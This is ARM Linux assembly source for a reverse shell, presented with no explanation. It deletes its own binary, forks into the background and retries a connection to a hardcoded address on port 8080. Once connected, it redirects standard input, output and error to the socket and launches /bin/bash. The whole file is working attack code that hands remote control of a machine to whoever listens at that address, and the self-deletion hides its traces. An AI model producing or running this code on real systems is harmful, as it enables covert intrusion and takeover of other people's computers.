.text
.global _start

.equ AF_INET, 2
.equ SOCK_STREAM, 1
.equ IPPROTO_TCP, 6

.equ PORT, 8080

_start:
	mov r7, #0xa		@ unlink
	ldr r0, [sp, #4]
	svc #0
	cmp r0, #0x0
	mov r7, #2		@ fork
	svc #0
	cmp r0, #0
	bne exit
	mov r7, #281		@ socket
	mov r0, #AF_INET
	mov r1, #SOCK_STREAM
	mov r2, #IPPROTO_TCP
	svc #0
	cmp r0, #0
	blt socket_error
	mov r8, r0

connect_loop:
	mov r7, #283
	mov r0, r8
	ldr r1, =struct_sockaddr_in
	mov r2, #16
	svc #0
	cmp r0, #0
	blt connect_loop
	mov r7, #63
	mov r0, r8
	eor r1, r1
	svc #0
	mov r7, #63
	mov r0, r8
	add r1, r1, #1
	svc #0
	mov r7, #63
	mov r0, r8
	add r1, r1, #1
	svc #0
	mov r7, #11
	ldr r0, =shell
	eor r1, r1
	eor r2, r2
	svc #0
	mov r7, #4
	mov r0, #1
	ldr r1, =success_message
	mov r2, #8
	svc #0
	b exit

socket_error:
	mov r7, #4		@ write
	mov r0, #2
	ldr r1, =socket_error_message
	mov r2, #socket_error_len
	svc #0
	mov r7, #1		@ exit
	mov r0, #1
	svc #0

exit:
	mov r7, #0x1		@ exit
	eor r0, r0, r0
	svc #0


.data
socket_error_message:
	.asciz "socket() Failed"
socket_error_len = .-socket_error_message

struct_sockaddr_in:
	.hword AF_INET
	.hword 0x901f
	.word  0x9702a8c0
	.fill 8, 1, 0
shell:
	.asciz "/bin/bash"
success_message:
	.asciz "success"
